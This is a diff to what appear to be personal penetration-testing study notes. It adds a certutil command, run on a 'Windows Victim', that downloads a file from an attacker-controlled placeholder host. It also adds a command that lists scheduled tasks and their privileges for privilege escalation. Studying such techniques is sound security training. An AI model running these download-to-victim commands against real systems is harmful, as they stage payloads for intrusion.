@@ -119,7 +119,9 @@ Once the file has been generated, we can replace the executable on the windows s
 ####################
 
 In Windows VIctim Download File:
-        certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName
+        certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName<- We can change the neame of the exe that will be downloaded locally
+            or
+        certutil.exe -urlcache -f http://x.x.x.x:8080/FileName  FileName
 
 Simple SCP from Windows Victim Machine to ATTAK Machine Kali:
     scp FileNAme <Username>@<KALI IP>:/FilePAth/ .
@@ -357,6 +359,9 @@ to download an exe from powershell on a web server in our Kali machine
 Privilege Escalation Windows
 ##################
     https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+    Windows cmd that list Schedule TaskName + Privileges:
+    -> schtask /query /fo /LIST /v /TN "TaskName"
 
 
 ####################
